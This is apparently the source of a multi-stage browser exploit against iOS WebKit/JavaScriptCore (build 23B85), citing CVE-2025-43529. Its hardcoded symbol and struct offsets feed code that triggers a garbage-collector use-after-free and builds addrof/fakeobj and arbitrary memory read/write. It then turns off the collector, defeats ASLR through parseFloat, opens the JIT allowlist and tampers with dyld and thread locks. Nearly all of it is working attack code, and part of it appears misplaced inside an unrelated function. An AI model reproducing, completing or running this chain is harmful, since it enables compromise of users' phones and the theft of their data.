            "GPUProcess_singleton": 0x1eb01db60n,
            "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt": 0x1ed5697b0n,
            "ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage": 0x1ed5697a8n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage": 0x1ed569738n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1ed569730n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata": 0x1ed5693b8n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddExif": 0x1ed569728n,
            "ImageIO__gImageIOLogProc": 0x1ee39b008n,
            "libdyld__gAPIs": 0x1ed0b4010n,
            "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
            "mach_task_self_ptr": 0x280a64078n,
            "mainRunLoop": 0x1ed7ac020n,
            "NSConcreteMapTable_countOff": 0x1ed42f2bcn, // ldrsw ivar-offset globals (layout from getKeys:values: disasm, bundleWithPath-and-round2.md)
            "NSConcreteMapTable_keysOff": 0x1ed42f2c0n,
            "NSConcreteMapTable_valuesOff": 0x1ed42f2c4n,
            "PassKitCore__OBJC_CLASS__PKContact": 0x1ed6d0e90n, // (23B85 objc class-opt list; format validated vs AVSpeechSynthesisVoice=0x1ed744f08). NOTE: useless as a wake trigger -- loadObjcClass only rides the AVFAudio->TextToSpeech deferred loader, so planting a non-AVFAudio class loads NOTHING (proven by run 014753: 4 loads, zero atexit activity). Kept for stage6's PKContact patch.
            "pthread_create": 0x1df150ee8n,
            "runLoopHolder_tid": 0x1ed7bcd08n,
            "Security__gSecurityd": 0x1ea91d500n,
            "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
            "UIKitCore__OBJC_CLASS__UIManagedDocument": 0x1ee3f9980n, // wake target 1: +initialize -> dlopen(CoreData) direct, NO NSBundle/lock (deferred-loader-pairs.md (b2)); UIKitCore always in WebContent, CoreData not at boot
            "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
            "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed624310n,
            "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType": 0x1ed6238a0n,
            "WebCore__softLinkOTSVGOTSVGTableRelease": 0x1ee638020n,
            "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
            "libARI_cstring": 0x2958de820n,
            "libGPUCompilerImplLazy_cstring": 0x24c060870n,
            "libGPUCompilerImplLazy__invoker": 0x24cf168b4n,
            "libsystem_pthread_base": 0x1df14d000n,
            "pthread_linkedit": 0x1ffd24000n,
            "PerfPowerServicesReader_cstring": 0x25e025e60n,
            "AVFAudio__cfstr_SystemLibraryTextToSpeech": 0x1f3850990n,
            "dyld__RuntimeState_vtable": 0x1eee9ed38n, // 23B85: __ZTVN5dyld412RuntimeStateE (was stale 0x1eee9f700)
            "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
            "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
            "RemoteGraphicsContextGLWorkQueue": 0x1ed642298n,
            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f141dec8n, //offset finder got this incorrect but this is the manually verified correct addr 
            "WebCore__initPKContact_once": 0x1ed625138n,
            "WebCore__initPKContact_value": 0x1ed625140n,
            "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
            "WebCore__HTMLDocument_vtable": 0x1f1376268n,
            "DesktopServicesPriv_bss": 0x1ecff4080n,
            "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
            "pthread_create_jsc": 0x1998f5688n,
            "libsystem_kernel__thread_suspend": 0x22ca45238n,
            "libdyld__dlopen": 0x1800e8350n,
            "libdyld__dlsym": 0x1800e8444n,
            "jsc_base": 0x197f59000n,
            "dyld__dlopen_from_lambda_ret": 0x18013a89cn, // ret into APIs::dlopen_from after the load-lambda(0x1801533b4) call; 3 sites 0x18013a89c/0x18013a944/0x18013a980 - primary=first, confirm on-device which is on the parked stack (was stale 0x18011cfc8=aligned_alloc+184)
            "dyld__signPointer": 0x1801283e4n, //todo verify offset finder thinks correct 
            "dyld__RuntimeState_emptySlot": 0x180162658n, // RuntimeState::emptySlot() = vtable[0] (read from __ZTVN5dyld412RuntimeStateE+0x10; was stale 0x18015eb6c=decDlRefCount+632)
            "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
            "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
            "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
            "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
            "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
            "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
            "HOMEUI_cstring": 0x1834dbfa1n,
            "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt_func": 0x1a5a87078n,
            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage_func": 0x1a5a87228n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage_func": 0x1a5a4a570n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation_func": 0x1a5a4ab94n,
            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata_func": 0x1a5a4b2a8n,
            "CMPhoto__CMPhotoCompressionSessionAddExif_func": 0x1a5a4ace0n,
        },
        structs: {
            // --- GC disable (disableGC) ---
            GlobalObject_toVM_a: 0x10n,   // addrof(globalThis)+0x10 -> intermediate
            GlobalObject_toVM_b: 0x38n,   // intermediate+0x38       -> JSC::VM*
            VM_heap: 0xc0n,   // offsetof(JSC::VM, heap)
            Heap_isSafeToCollect: 0x259n,  // offsetof(JSC::Heap, m_isSafeToCollect)
            // --- ASLR slide leak (parseFloat native fn) ---
            JSFunction_executable: 0x18n,   // JSFunction::m_executableOrRareData
            NativeExecutable_function: 0x28n,   // NativeExecutable::m_function (noPAC)
            // --- worker forward chain (ctx -> JS globalScope), from 23B85 WebCore disasm ---
            WorkerGlobalScope_script: 0x160n,  // WorkerOrWorkletGlobalScope::m_script
            ScriptController_wrapper: 0x20n,   // WorkerOrWorkletScriptController::m_globalScopeWrapper (Strong slot -> deref)
            WorkerGlobalScope_thread: 0x170n,  // WorkerOrWorkletGlobalScope::m_thread = ThreadSafeWeakPtr.m_objectOfCorrectType (TaggedPtr, +0 of the weak ptr) -> WorkerOrWorkletThread* (mask tag w/ noPAC)
            WorkerThread_wtfThread: 0x28n,     // WorkerOrWorkletThread::m_thread -> WTF::Thread (start() disasm: str x8,[this,#0x28]; == DarkSword)
            // --- allScriptExecutionContextsMap walk (stage3) ---
            ContextsMap_stride: 0x30n,   // sizeof(HashMap bucket)
            ContextsMap_value: 0x20n,   // bucket -> ScriptExecutionContext*
            // --- stage4: AXCoreUtilities DefaultLoader dispatch chain (Part A, disarm callback) ---
            //     [LIVE] validate via the defaultLoader/dispatchSource/dispatchBlock logs
            DefaultLoader_dispatchSource: 0x18n,
            DispatchSource_inner: 0x58n,
            DispatchInner_block: 0x28n,
            DispatchBlock_invoke: 0x20n,   // [write] block invoke fn-ptr <- paciza_nullfunc
            // --- stage4: ImageBitmap -> image buffer (Parts B/C + loadObjcClass) ---
            //     [LIVE] validate via wrappedBitmap/imageBuffer logs (IOSurface internals)
            JSImageBitmap_wrapped: 0x18n,  // addrof(bitmap)+0x18 -> C++ ImageBitmap
            ImageBitmap_buffer: 0x10n,     // ImageBitmap -> image buffer
            ImageBuffer_objcClass: 0x20n,  // [write] planted ObjC Class*
            // --- stage4: NSBundleTables / loadedFrameworks walk (CONFIRMED via class-dump 23B85) ---
            NSBundleTables_loadedFrameworks: 0x20n,  // __NSBundleTables._loadedFrameworks (NSConcreteHashTable)
            LoadedFrameworks_count: 0x30n,           // NSConcreteHashTable.capacity (iteration bound; slots are sparse)
            LoadedFrameworks_buffer: 0x08n,          // NSConcreteHashTable.slice.items (void** backing)
            // --- stage4: NSBundle ivars (CONFIRMED via class-dump, unchanged 23B85) ---
            NSBundle_flags: 0x08n,        // [write 0x40008] _flags
            NSBundle_cfBundle: 0x10n,     // _cfBundle
            NSBundle_initialPath: 0x28n,  // _initialPath (compared vs cfstr ".../TextToSpeech")
            NSBundle_lock: 0x40n,         // [stage5 write 0]  _lock (os_unfair_lock; cleared so the bundle re-resolves) -- ivar layout: _resolvedPath@0x30, _firstClassName@0x38, _lock@0x40
            // --- stage4: CFBundle internals (CoreFoundation, opaque struct) ---
            CFBundle_loadedFlag: 0x34n,   // [write8 0]  [LIVE via libARI load]
            CFBundle_execPath: 0x68n,     // [write] exec path -> forged CFString
            // --- stage4: forged CFString (CONFIRMED canonical __CFString layout) ---
            CFString_dataPtr: 0x10n,      // [write] char* -> libARI path
            CFString_length: 0x18n,       // [write] length (0x15)
            // --- stage4: libsystem_c atexit mutex guard ---
            Atexit_mutexState: 0x20n,     // [write 0x102]
            // --- stage5: dyld4::RuntimeState internals (dyld in shared cache) ---
            RuntimeState_lock: 0x70n,         // RuntimeState -> _locks (runtimeStateLock)   [verify]
            RuntimeStateLock_word: 0x0n,      // zero the dlopen-lock GUARD at *(RuntimeLocks+0). Confirmed via 23B85 disasm: BOTH takeDlopenLockBeforeFork@0x18015335c AND releaseDlopenLockInForkParent@0x180156ee0 do `ldr x0,[this]; cbz x0,ret` on +0, and NEITHER writes +0 (persistent init-set pointer -> our zero holds). guard=0 => the main wake-load NEVER acquires the lock AND worker1's finalize+main both skip releaseDlopenLockInForkParent's os_unfair_lock_unlock(+0x20) -> no cross-thread unlock -> no 26.1 os_unfair_lock abort. Zeroing +0x20 (the lock word) instead leaves the guard set, so release runs os_unfair_lock_unlock on a value=0 lock -> EXC_BREAKPOINT abort (the crash 2026-07-14). MUST be 0x0, NOT 0x20.
            RuntimeState_interposeBuf: 0xb8n, // RuntimeState._interposingTuplesAll buffer    [verify]
            RuntimeState_interposeSize: 0xc0n,// RuntimeState._interposingTuplesAll size      [verify]
            // --- stage5: WTF::Thread stack bounds (CONFIRMED: m_stack@0x10 = vtable@0+refcount@8; StackBounds{m_origin@0,m_bound@8}) ---
            Thread_stackBottom: 0x10n,        // WTF::Thread.m_stack.m_origin (high addr)
            Thread_stackTop: 0x18n,           // WTF::Thread.m_stack.m_bound  (low addr)
            StackFrame_loader: 0x78n,         // dlopen frame -> parked dyld Loader* [verify]
            // --- stage5: fake StringImpl for efficient_search (mirrors stage1 read primitive) ---
            StringImpl_flags: 0x1000n,        // 8-bit buffer flag OR'd with (length<<32)
            StringImpl_data: 0x08n,           // StringImpl m_data (char* buffer)
        },
    },
};

const TARGET_BUILD = "23B85";
const offsets = VERSIONS[TARGET_BUILD].syms;
const structs = VERSIONS[TARGET_BUILD].structs;
p.offsets = offsets;
p.structs = structs;

function signed32(v) {
    v &= 0xffffffffn;
    if (v >= 0x80000000n) return Number(v - 0x100000000n);
    return Number(v);
}

function plausiblePointer(ptr) {
    return typeof ptr === "bigint" &&
        ptr >= 0x100000000n &&
        ptr < 0x0001000000000000n &&
        (ptr & 0x7n) === 0n;
}

// ---------------------------------------------------------------------
//  Stage 1a: the CVE-2025-43529 GC-race UAF + reclaim -> addrof / fakeobj
// ---------------------------------------------------------------------
const rootArray = new Array(0x40_0000).fill(1.1);
const rootIndex = rootArray.length - 1;
const reclaimed = [];

function triggerUAF(flag, k, allocCount) {
    const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    rootArray[rootIndex] = A;

    const forGC = [];
    const a = new Date(1111);
    a[0] = 1.1;

    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(0x80_0000));
    }

    A.p2 = forGC;
    const b = { p0: 0x42424242, p1: 1.1 };

    let f = b;
    if (flag) f = 1.1;

    A.p1 = f;

    let v = 1.1;
    for (let i = 0; i < 1e6; ++i) {
        for (let j = 0; j < k; ++j) {
            v = i;
            v = j;
        }
    }

    b.p0 = v;
    b.p1 = a;
}

function recursive(n) {
    if (n === 0) return;
    recursive((n | 0) - 1);
}

function safeRecursive(n) {
    try { recursive(n); } catch (e) { }
}

// Drive the UAF and reclaim the freed cell with a controllable array, giving
// the classic float/object type-confusion pair -> addrof / fakeobj.
// Returns { addrof, fakeobj } on success, or null if reclaim never landed.
async function acquireRW() {
    triggerUAF(true, 1, 1);
    triggerUAF(false, 1, 1);
    for (let i = 0; i < 1000; ++i) triggerUAF(false, 0, 0);
    for (let i = 0; i < 20; ++i) safeRecursive(800);

    let lastProgress = Date.now();
    for (let k = 0; k < 15000; ++k) {
        triggerUAF(false, 10, (k % 5) + 1);
        safeRecursive(800);
        for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);

        let freed;
        try {
            freed = rootArray[rootIndex].p1.p1;
        } catch (e) {
            continue;
        }

        let winningArray = null;
        const noCow = 13.37;
        for (let i = 0; i < 64; ++i) {
            const spray = [13.37, 2.2, 3.3, 4.4, noCow];
            reclaimed.push(spray);
            try {
                if (freed[0] === 13.37) {
                    winningArray = spray;
                    break;
                }
            } catch (e) { }
        }

        if (!winningArray) {
            if ((Date.now() - lastProgress) > 1500) {
                postMessage(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`);
                lastProgress = Date.now();
                await new Promise(r => setTimeout(r, 1));
            }
            continue;
        }

        // boxedArray reads JSValues, unboxedArray (the freed cell) reads raw floats:
        // write an object to boxedArray[0] -> read its pointer as a float from
        // unboxedArray[0], and vice versa.
        const boxedArray = winningArray;
        boxedArray[0] = {};
        const unboxedArray = freed;
        self[0] = unboxedArray;   // keep both alive as indexed globals
        self[1] = boxedArray;

        const addrof = (obj) => { boxedArray[0] = obj; return ftoi(unboxedArray[0]); };
        const fakeobj = (addr) => { unboxedArray[0] = itof(addr); return boxedArray[0]; };
        return { addrof, fakeobj };
    }
    return null;
}

// ---------------------------------------------------------------------
//  Stage 1b: DarkSword "scribble" -> arbitrary read64 / write64
//  Installs p.read64 / p.write64 / p.read32 / p.write8 / p.write16.
//  Those closures capture the underlying scribble objects, so storing them
//  in `p` keeps the whole primitive alive for every later stage / message.
// ---------------------------------------------------------------------
function buildScribbleRW(addrof, fakeobj) {
    const read64BigUint64 = new BigUint64Array(4);
    const read64Str = "䑄".repeat(0x10);
    void [][read64Str];

    // 1) find a JSObject sitting exactly 0x20 after a previous one.
    let scribbleElement = null;
    let prevAddr = 0n;
    const keepAlive = [];
    for (let i = 0; i < 1000; ++i) {
        const o = { p1: 1.1, p2: 2.2 };
        const addr = addrof(o);
        if (addr - prevAddr === 0x20n) {
            scribbleElement = o;
            break;
        }
        keepAlive.push(o);
        prevAddr = addr;
    }
    if (!scribbleElement) return false;

    // 2) overlay a fake DoubleArray on the holder's inline slots; p1 becomes the
    //    fake cell header, p2 (= scribbleElement) becomes its butterfly.
    const changeScribbleHolder = {
        p1: fakeobj(0x108240700000000n), // placeholder header: ArrayWithDouble, structureID 0 (ok for the read fast path)
        p2: scribbleElement
    };
    const changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);

    scribbleElement.p3 = 1.1;
    scribbleElement[0] = 1.1;            // promote scribbleElement to ArrayWithDouble

    // harvest a *valid* DoubleArray cell header (real structureID) and reuse it
    const doubleArrayCell = ftoi(changeScribble[0]);
    changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
    const originalCell = changeScribble[0];

    // 3) write64: aim changeScribble's butterfly at the target via scribbleElement.p3
    const write64 = function (addr, value) {
        addr = BigInt.asUintN(64, addr);
        value = BigInt.asUintN(64, value);

        changeScribble[0] = originalCell;
        changeScribble[1] = itof(addr + 0x10n);

        if (value === 0n) {
            scribbleElement.p3 = 1;
            delete scribbleElement.p3;
        } else if ((value >= 0x2000000000000n && value <= 0x7ff2000000000000n) ||
            (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
            scribbleElement.p3 = itof(value - 0x2000000000000n);
        } else {
            // split 32-bit write. Handles both small values (< 0x2000000000000, which used to go
            // through fakeobj) and non-double-encodable large values. fakeobj is broken after
            // stage4's close()/park (same as addrof), so we must never route through it here.
            const offAddr = addr + 8n;
            const offVal = read64(offAddr);
            const lo = signed32(value);
            const hi = signed32(value >> 32n);
            scribbleElement.p3 = lo;
            changeScribble[1] = itof(addr + 0x14n);
            scribbleElement.p3 = hi;
            write64(offAddr, offVal);
        }
    };

    // 4) read64: a fake JSString window over a BigUint64Array; charCodeAt reads target
    changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
    const read64Float64Bytes = ftoi(scribbleElement[1]);
    read64BigUint64[0] = 0x10000000006n;
    read64BigUint64[1] = read64Float64Bytes + 0x10n;

    changeScribble[1] = itof(addrof(read64Str) + 8n);
    scribbleElement[0] = itof(read64Float64Bytes);

    const read64 = function (addr) {
        read64BigUint64[1] = BigInt.asUintN(64, addr);
        return BigInt(read64Str.charCodeAt(0)) |
            (BigInt(read64Str.charCodeAt(1)) << 16n) |
            (BigInt(read64Str.charCodeAt(2)) << 32n) |
            (BigInt(read64Str.charCodeAt(3)) << 48n);
    };

    const read32 = function (addr) {
        read64BigUint64[1] = BigInt.asUintN(64, addr);
        return BigInt(read64Str.charCodeAt(0)) | (BigInt(read64Str.charCodeAt(1)) << 16n);
    };

    const write8 = function (ptr, b) {
        let value = read64(ptr);
        value &= ~0xffn;
        value |= b;
        write64(ptr, value);
    };

    const write16 = function (ptr, h) {
        let value = read64(ptr);
        value &= ~0xffffn;
        value |= h;
        write64(ptr, value);
    };

    // Rebuild addrof/fakeobj on top of read64/write64 so they survive stage4's close()/park (which
    // reclaims the UAF's dangling cell and breaks the ORIGINAL addrof/fakeobj). holderObj is a normal
    // LIVE object (GC-safe, real structure) -- not a dangling alias. `pad` (a large double) sits in the
    // slot right after `x`, so write64's split-write of a small pointer into x's slot restores pad in
    // ONE double-encoded step (no unbounded recursion). We locate x's inline slot by planting a marker.
    const holderObj = { x: null, pad: 1.3e300 };
    p.holderObj = holderObj;
    const _marker = {};
    holderObj.x = _marker;
    const _markerAddr = addrof(_marker);
    let xSlot = 0n;
    for (let off = 0x10n; off <= 0x30n; off += 8n) {
        if (read64(addrof(holderObj) + off) === _markerAddr) { xSlot = addrof(holderObj) + off; break; }
    }
    holderObj.x = null;
    p.xSlot = xSlot;
    p.addrofRW = (obj) => { holderObj.x = obj; return read64(xSlot); };
    p.fakeobjRW = (addr) => { write64(xSlot, addr); return holderObj.x; };
    p.rwRebuildOk = (xSlot !== 0n) &&
        (p.addrofRW(_marker) === _markerAddr) &&
        (p.fakeobjRW(_markerAddr) === _marker);
    holderObj.x = null;

    p.read64 = read64;
    p.read32 = read32;
    p.write64 = write64;
    p.write8 = write8;
    p.write16 = write16;
    
    p.write32le = (addr, v32) => {           // 32-bit store via two 16-bit writes — never touches the neighbor word
        v32 = BigInt(v32);
        p.write16(addr, v32 & 0xffffn);
        p.write16(addr + 2n, (v32 >> 16n) & 0xffffn);
    };

    // read64 re-linker: a heavy dlopen (libGPUCompilerImplLazy in stage6) clobbers read64Str's
    // overwritten StringImpl->backing linkage, after which every read64 returns a stale constant
    // (0x9) and write64(small) recurses to death. The scribble (write path) survives, so re-point
    // read64Str at read64BigUint64's CURRENT backing through the scribble. addrof is captured NOW
    // (GC off -> the cells don't move) so the re-linker needs no working read64/addrof. Call after
    // any framework load (see loadObjcClass).
    p.read64Str_addr = addrof(read64Str);
    p.read64BigUint64_addr = addrof(read64BigUint64);
    p.reestablishRead64 = function () {
        changeScribble[1] = itof(p.read64BigUint64_addr + 8n);
        const rf = ftoi(scribbleElement[1]);
        read64BigUint64[0] = 0x10000000006n;
        read64BigUint64[1] = rf + 0x10n;
        changeScribble[1] = itof(p.read64Str_addr + 8n);
        scribbleElement[0] = itof(rf);
    };
    return true;
}

// ---------------------------------------------------------------------
//  Stage 2: neutralize JSC defenses, leak the slide, locate the workers.
//  Built entirely on p.read64 / p.write64 from stage 1.
// ---------------------------------------------------------------------
// Self-test the primitives before stage 1 hands off: cross-check addrof/fakeobj/
// read64/write64 against ground truth (a TypedArray's own backing store) and confirm
// read64 can pull a real shared-cache pointer. If any of these fail, R/W is wrong and
// the slide leak would march the jsc_base scan off into unmapped memory.

function sanityCheckRW() {
    const { addrof, fakeobj, read64, write64 } = p;
    const fail = (m) => { postMessage("[assert] FAIL: " + m); return false; };

    // addrof returns a plausible, aligned heap pointer
    const probe = { marker: 1.1 };
    const a = addrof(probe);
    if (!plausiblePointer(a)) return fail(`addrof implausible: ${hex(a)}`);

    // addrof / fakeobj are inverse
    if (fakeobj(a) !== probe) return fail("fakeobj(addrof(o)) !== o");

    // read64 / write64 cross-checked vs a TypedArray's own backing store (known, mapped)
    const t = new BigUint64Array(8);
    const td = read64(addrof(t) + 0x10n);            // m_vector (data pointer)
    if (!plausiblePointer(td)) return fail(`typedarray backing implausible: ${hex(td)}`);
    t[0] = 0x4142434445464748n;                       // JS writes -> read64 must see it
    if (read64(td) !== 0x4142434445464748n) return fail(`read64 != JS write: ${hex(read64(td))}`);
    write64(td + 8n, 0xcafef00dd00dfeedn);            // write64 writes -> JS must see it
    if (t[1] !== 0xcafef00dd00dfeedn) return fail(`write64 != JS read: ${hex(t[1])}`);
    t[2] = 0xffffffffffffffffn;                       // catch 16/32-bit truncation in read64
    if (read64(td + 0x10n) !== 0xffffffffffffffffn) return fail(`read64 truncates high bits: ${hex(read64(td + 0x10n))}`);

    // cache read: parseFloat -> m_executable -> NativeExecutable.m_function
    // must land inside the dyld shared cache, or the slide leak / jsc_base scan is doomed.
    const executable = read64(addrof(parseFloat) + structs.JSFunction_executable);
    if (!plausiblePointer(executable)) return fail(`parseFloat executable implausible: ${hex(executable)}`);
    const fn = noPAC(read64(executable + structs.NativeExecutable_function));
    if (fn < 0x180000000n || fn >= 0x400000000n) return fail(`parseFloat native ptr not in shared cache: ${hex(fn)} (exec ${hex(executable)})`);

    postMessage(`[assert] R/W OK  (parseFloat native = ${hex(fn)})`);
    return true;
}

// Disable the GC (Heap::m_isSafeToCollect = 0) so the fake scribble cells built in
// stage 1 are never visited by the collector. MUST run in the same synchronous span
// as buildScribbleRW -- before we yield to the event loop, otherwise a collection in
// the gap marks a fake cell -> JSObject::visitChildren crash.
function disableGC() {
    const { read64, write8, addrof } = p;
    // globalThis -> VM -> Heap; offsets decoded from the 23B85 JavaScriptCore binary.
    const vm = read64(read64(addrof(globalThis) + structs.GlobalObject_toVM_a) + structs.GlobalObject_toVM_b);
    const heap = vm + structs.VM_heap;
    const isSafeToCollect = heap + structs.Heap_isSafeToCollect;
    p.vm = vm;
    p.heap = heap;
    write8(isSafeToCollect, 0n);
    postMessage(`[GC] m_isSafeToCollect(${hex(isSafeToCollect)}) = 0  (vm ${hex(vm)})`);
}

function enableGC() {
    const { read64, write8, addrof } = p;
    // globalThis -> VM -> Heap; offsets decoded from the 23B85 JavaScriptCore binary.
    const vm = read64(read64(addrof(globalThis) + structs.GlobalObject_toVM_a) + structs.GlobalObject_toVM_b);
    const heap = vm + structs.VM_heap;
    const isSafeToCollect = heap + structs.Heap_isSafeToCollect;
    p.vm = vm;
    p.heap = heap;
    write8(isSafeToCollect, 1n);
    postMessage(`[GC] m_isSafeToCollect(${hex(isSafeToCollect)}) = 0  (vm ${hex(vm)})`);
}
async function stage2() {
    const { read64, read32, write64, addrof } = p;

    // --- leak the JSC slide via parseFloat's native implementation ---
    // JSFunction.m_executableOrRareData -> NativeExecutable.m_function
    const executable = read64(addrof(parseFloat) + structs.JSFunction_executable);
    const globalFuncParseFloat = noPAC(read64(executable + structs.NativeExecutable_function));
    postMessage(`[globalFuncParseFloat] ${hex(globalFuncParseFloat)}`);
    const slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
    p.slide = slide;
    if (!p.slideApplied) {
        for (const k of Object.keys(offsets)) {
            if (offsets[k] >= 0x100000000n) offsets[k] += slide;
        }
        p.slideApplied = true;
    }

    let machoHdr = read64(offsets.jsc_base);
    if ((machoHdr & 0xffffffffn) !== 0xfeedfacfn) {
        return fail("jsc_base not found");
    }
    // --- open the JIT call-target allowlist (so redirected native calls pass) ---
    write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
    write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
    postMessage(`[jitAllowList] ${hex(read64(offsets.JavaScriptCore__jitAllowList + 8n))}`);
    postMessage(`[stage2] done; ASLR defeated, jitAllowList modified`);
}

// Worker forward chain (ctx -> JS globalScope). Field offsets live in
// VERSIONS[TARGET_BUILD].structs (read from the 23B85 WebCore binary via ipsw disass):
//   WorkerOrWorkletGlobalScope::m_script                  (vmIfExists @0x1a1a2cd48 / clearScript @0x1a1a2ccec)
//   WorkerOrWorkletScriptController::m_globalScopeWrapper (globalScopeWrapper @0x1a0199c58, Strong slot -> deref)
//   WorkerOrWorkletGlobalScope::m_thread = ThreadSafeWeakPtr (weak -> control-block deref, resolved in stage4)
const workerGlobalScope = (ctx) => {
    const controller = p.read64(ctx + structs.WorkerGlobalScope_script);
    const slot = p.read64(controller + structs.ScriptController_wrapper);   // Strong's m_slot (JSValue*)
    return p.read64(slot);                                                   // *m_slot = the JSDedicatedWorkerGlobalScope
};
const workerMarker = (ctx) => p.read64(p.read64(workerGlobalScope(ctx) + 8n));        // gs.butterfly[0]
const workerBitmap = (ctx) => p.read64(p.read64(workerGlobalScope(ctx) + 8n) + 8n);   // gs.butterfly[1]
// ---- Mach thread-port tokens (validated, no speculative derefs) ----
const OFF_WOT_GLOBALSCOPE = 0x20n;   // WorkerOrWorkletThread::m_globalScope back-ptr
const OFF_WOT_WTFTHREAD = 0x28n;   // WorkerOrWorkletThread::m_thread
const PTHREAD_SIG = 0x54485244n; // 'THRD'
const PTHREAD_TQE_NEXT = 0x10n;   // pthread_s.tl_plist.tqe_next

function tsdOffsetFor(pthreadPtr) {              // cached self-anchor scan
    if (p.tsdOff) return p.tsdOff;
    for (let off = 0x80n; off <= 0x120n; off += 8n) {
        if (p.read64(pthreadPtr + off) === pthreadPtr) {   // tsd[0] == THREAD_SELF
            p.tsdOff = off;
            postMessage(`[token] tsd offset = +${hex(off)} (expect 0xe0)`);
            return off;
        }
    }
    return 0n;
}

// =====================================================================
// Mach thread-port tokens (validated, no speculative derefs)
//
//   ctx --(+structs.WorkerGlobalScope_thread)--> WorkerOrWorkletThread
//         --(+0x28)--> WTF::Thread --(scan)--> pthread_t --> TSD slot 3
//
// Every computed pointer passes ptrOK before being dereferenced:
// on 23B85 userland data pointers live in 2^32..2^39 (heap 0x10ax..,
// stacks 0x16d/0x16f.., sharedCache 0x18..-0x1f..); anything outside
// that band is a packed small-int field, never a pointer.
// =====================================================================


function pollLocks(m) {
    const bundleLock = BigInt(m.bundleLock), lockWord = BigInt(m.lockWord);
    const workerPthread = BigInt(m.workerPthread), countSeed = BigInt(m.countSeed || '0x2');
    if (!sanityCheckRW()) p.reestablishRead64();
    postMessage('[poll] armed bundle=' + m.bundleLock + ' wPthread=' + m.workerPthread + ' seed=' + m.countSeed);
    let lastO = -1n, lastC = -1n, lastL = -1n, i = 0, forged = false, tForge = 0;
    const t0 = Date.now();
    while (Date.now() - t0 < (m.seconds || 10) * 1000) {
        const o = BigInt(p.read32(bundleLock));
        const c = BigInt(p.read32(bundleLock + 4n));
        if (!forged && o !== 0n) {                    // first nonzero owner = chainTok — fire even if we missed the 0-state
            p.write32le(bundleLock + 4n, c + countSeed);
            p.write32le(workerPthread + 0xf8n, o);
            const chkC = BigInt(p.read32(bundleLock + 4n));
            const chkT = BigInt(p.read32(workerPthread + 0xf8n));
            forged = true; tForge = Date.now();
            postMessage(`[poll] SEEDFORGE chainTok=${hex(o)} count ${hex(c)}>${hex(chkC)} tsd3=${hex(chkT)} (want ${hex(o)})`);
        }
        if (o !== lastO || c !== lastC) {
            postMessage(`[trace] {${hex(lastO)},${hex(lastC)}} > {${hex(o)},${hex(c)}}`);
            lastO = o; lastC = c;
        }
        if ((i++ & 7) === 0) {
            const l = BigInt(p.read32(lockWord));
            if (l !== lastL) { postMessage(`[trace] L ${hex(lastL)}>${hex(l)}`); lastL = l; }
        }
        if (forged && Date.now() - tForge > 2000) break;
    }
    postMessage(`[trace end] owner=${hex(lastO)} count=${hex(lastC)} forged=${forged}`);
}



const ptrOK = (v) => v >= 0x100000000n && (v >> 39n) === 0n && (v & 0x7n) === 0n;

function dumpObject(name, addr, bytes) {                 // reads stay INSIDE addr..addr+bytes
    for (let off = 0n; off < bytes; off += 8n) {
        const q = p.read64(addr + off);
        const lo = q & 0xffffffffn, hi = q >> 32n;
        const tag = ptrOK(q) ? "PTR" : (hi === 0n && lo !== 0n) ? `u32=${lo}` : "";
        postMessage(`[dump ${name}] +${off.toString(16).padStart(2, "0")} ${hex(q)} ${tag}`);
    }
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
